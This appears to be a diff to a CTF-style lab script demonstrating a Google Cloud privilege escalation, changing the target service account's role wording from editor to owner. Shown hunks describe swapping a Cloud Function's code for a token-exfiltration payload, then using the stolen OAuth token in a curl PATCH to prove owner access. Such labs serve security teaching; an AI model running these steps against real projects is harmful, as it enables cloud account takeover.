@@ -8,7 +8,7 @@
 # target_sa (via a minimal actAs custom role granting only that permission).
 #
 # The victim function is already deployed by Terraform, running AS target_sa
-# (roles/editor), with a benign hello-world handler. The attacker replaces
+# (roles/owner), with a benign hello-world handler. The attacker replaces
 # the source code with a token-exfiltration payload while keeping target_sa
 # as the runtime SA. Invoking the updated function returns target_sa's OAuth
 # token from the metadata server, which is used directly against Google REST
@@ -111,7 +111,7 @@ for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID REGI
 done
 
 echo "Starting SA (no project role):     $STARTING_SA_EMAIL"
-echo "Target SA   (roles/editor, on fn): $TARGET_SA_EMAIL"
+echo "Target SA   (roles/owner, on fn): $TARGET_SA_EMAIL"
 echo "Deployer    (your ADC):            $DEPLOYER_EMAIL"
 echo "Region:                            $REGION"
 echo "Victim function:                   $VICTIM_FUNCTION_NAME"
@@ -470,8 +470,8 @@ if [ "$TOKEN_EMAIL" != "$TARGET_SA_EMAIL" ]; then
 fi
 echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"
 
-# Step 8: Prove editor-level write access using the stolen token
-echo -e "${YELLOW}Step 8: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
+# Step 8: Prove owner-level write access using the stolen token
+echo -e "${YELLOW}Step 8: [EXPLOIT] Verifying roles/owner write access via raw stolen token${NC}"
 show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
     "curl -X PATCH 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID?updateMask=labels' -H 'Authorization: Bearer <redacted>' -d '{\"labels\": {...}}'"
 
@@ -488,7 +488,7 @@ PATCH_RESPONSE=$(curl -s -X PATCH \
 
 if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
     echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
-    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+    echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
     curl -s -X PATCH \
         -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
         -H "Content-Type: application/json" \
@@ -539,7 +539,7 @@ echo "  $STARTING_SA_EMAIL"
 echo "    -> (cloudfunctions.functions.update + .sourceCodeSet + iam.serviceAccounts.actAs — THE VULNERABILITY)"
 echo "    -> updated code inside '$VICTIM_FUNCTION_NAME' (SA unchanged: $TARGET_SA_EMAIL)"
 echo "    -> exfiltrated OAuth access token (via metadata server)"
-echo "    -> (roles/editor on project $PROJECT_ID)"
+echo "    -> (roles/owner on project $PROJECT_ID)"
 echo "    -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
